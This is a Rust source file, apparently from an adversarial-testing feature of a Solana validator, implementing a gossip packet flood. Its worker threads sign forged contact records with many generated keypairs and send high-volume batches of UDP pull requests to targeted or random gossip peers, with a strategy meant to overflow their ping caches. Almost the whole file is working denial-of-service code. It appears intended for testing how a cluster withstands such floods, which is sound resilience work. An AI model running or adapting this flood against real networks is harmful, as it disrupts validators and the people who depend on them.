use {
    crate::{
        adversary_feature_set::gossip_packet_flood::{FloodConfig, FloodStrategy},
        flood_worker::{
            create_rayon_thread_pool, init_keypair_pool, AdversaryWorkersContext, ExitCondition,
        },
        PeerIdentifierSanitized,
    },
    bincode::serialize,
    log::{error, info},
    rand::seq::SliceRandom,
    rayon::{prelude::*, ThreadPool},
    solana_gossip::{
        cluster_info::ClusterInfo, contact_info::ContactInfo, crds_data::CrdsData,
        crds_gossip_pull::CrdsFilter, crds_value::CrdsValue, protocol::Protocol,
    },
    solana_keypair::Keypair,
    solana_net_utils::bind_to_unspecified,
    solana_signer::Signer,
    solana_streamer::sendmmsg::{batch_send, SendPktsError},
    std::{
        net::UdpSocket,
        sync::{Arc, RwLock},
        thread::{self, Builder},
        time::{Duration, Instant},
    },
};

pub struct GossipPacketFlood;

impl GossipPacketFlood {
    pub fn start(
        cluster_info: Arc<ClusterInfo>,
        configs: Vec<FloodConfig>,
    ) -> AdversaryWorkersContext {
        let exit = Arc::new(ExitCondition::default());
        let thread_pool = create_rayon_thread_pool("solAdvGPFWrkr");
        let keypair_pool = Arc::new(RwLock::new(Vec::default()));

        let mut i: usize = 0;
        let thread_hdls = configs
            .into_iter()
            .map(|config| {
                // We do not care what port this socket will use, as we are only going to send
                // packets from it.  It would be nice to consider the gossip address IP version.
                // But everything seems to be hardcoded to IPv4, so skip it for now.
                let send_socket = bind_to_unspecified().expect("Can bind to any local address");
                let cluster_info = cluster_info.clone();
                let exit = exit.clone();
                let thread_pool = thread_pool.clone();
                let thread_name = format!("solAdvGpFld{i:02}");
                let keypair_pool = keypair_pool.clone();

                i = i.saturating_add(1);
                Builder::new()
                    .name(thread_name.clone())
                    .spawn(move || {
                        Self::run(
                            &send_socket,
                            &cluster_info,
                            &exit,
                            &thread_pool,
                            config,
                            thread_name,
                            &keypair_pool,
                        );
                    })
                    .unwrap()
            })
            .collect();
        AdversaryWorkersContext::new(exit, thread_hdls)
    }

    fn flood_ping_cache(
        send_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        config: &FloodConfig,
        peers: &[ContactInfo],
        thread_pool: &ThreadPool,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) -> usize {
        const MIN_PARALLEL_ITEMS: usize = 1_000;
        const MAX_SENDMMSG_ITEMS: usize = 10_000;

        // Populate keypair pool if necessary
        // See GOSSIP_PING_CACHE_CAPACITY to size keypair_pool
        init_keypair_pool(
            keypair_pool,
            usize::try_from(config.packets_per_peer_per_iteration).unwrap(),
            thread_pool,
        );

        let mut packet_count: usize = 0;
        let keypairs = keypair_pool.read().unwrap();
        peers.iter().for_each(|peer| {
            for chunk in keypairs.chunks(MAX_SENDMMSG_ITEMS) {
                let reqs_v: Vec<_> = thread_pool
                    .install(|| {
                        chunk
                            .par_iter()
                            .with_min_len(MIN_PARALLEL_ITEMS)
                            .map(|keypair| {
                                let mut self_info = cluster_info.my_contact_info();
                                self_info.adversary_set_pubkey(keypair.pubkey());
                                let self_info = CrdsData::ContactInfo(self_info);
                                let self_info = CrdsValue::new(self_info, keypair);
                                let filter = CrdsFilter::new_rand(10, 1000);
                                let msg = Protocol::PullRequest(filter, self_info);
                                let packet_buf = serialize(&msg).unwrap();
                                (packet_buf, peer.gossip().unwrap())
                            })
                    })
                    .collect();
                packet_count = packet_count.saturating_add(reqs_v.len());
                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
                match batch_send(send_socket, reqs_iter) {
                    Ok(()) => (),
                    Err(SendPktsError::IoError(err, num_failed)) => {
                        packet_count = packet_count.saturating_sub(num_failed);
                        error!(
                            "batch_send failed to send {}/{} packets first error {:?}",
                            num_failed,
                            reqs_v.len(),
                            err
                        );
                    }
                }
            }
        });
        packet_count
    }

    fn run(
        send_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        exit: &ExitCondition,
        thread_pool: &ThreadPool,
        config: FloodConfig,
        thread_name: String,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) {
        const REPORT_INTERVAL_MS: u64 = 2_000;
        const DEFAULT_NUM_PEERS: usize = 10;
        let mut last_report = Instant::now();
        let mut iteration: u64 = 0;
        let mut packet_count: usize = 0;

        loop {
            if exit.is_set() {
                return;
            }

            let peers = {
                let peers = cluster_info.gossip_peers();
                if let Some(peer_id) = config.target.as_ref() {
                    // pubkey verified by RPC
                    let peer_id = PeerIdentifierSanitized::try_from(peer_id).unwrap();
                    let matches_ci = |ci: &&ContactInfo| -> bool {
                        match peer_id {
                            PeerIdentifierSanitized::Pubkey(pubkey) => pubkey == *ci.pubkey(),
                            PeerIdentifierSanitized::Ip(ip) => ip == ci.gossip().unwrap().ip(),
                        }
                    };
                    peers
                        .iter()
                        .find(matches_ci)
                        .cloned()
                        .map(|ci| vec![ci])
                        .unwrap_or_else(|| {
                            error!("gossip packet flood: target={peer_id:?} not found");
                            thread::sleep(Duration::from_secs(2));
                            Vec::default()
                        })
                } else {
                    let mut rng = rand::thread_rng();
                    peers
                        .choose_multiple(&mut rng, DEFAULT_NUM_PEERS)
                        .cloned()
                        .collect()
                }
            };

            packet_count = packet_count.saturating_add(match config.flood_strategy {
                FloodStrategy::PingCacheOverflow => Self::flood_ping_cache(
                    send_socket,
                    cluster_info,
                    &config,
                    &peers,
                    thread_pool,
                    keypair_pool,
                ),
            });
            if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                let num_peers = peers.len();
                info!(
                    "gossip packet flood {thread_name}: num_peers={num_peers} \
                     iteration={iteration}, packets={packet_count}"
                );
                packet_count = 0;
                last_report = Instant::now();
            }
            iteration = iteration.saturating_add(1);
            if config.iteration_delay_us > 0
                && exit.wait_is_set(Duration::from_micros(config.iteration_delay_us))
            {
                return;
            }
        }
    }
}
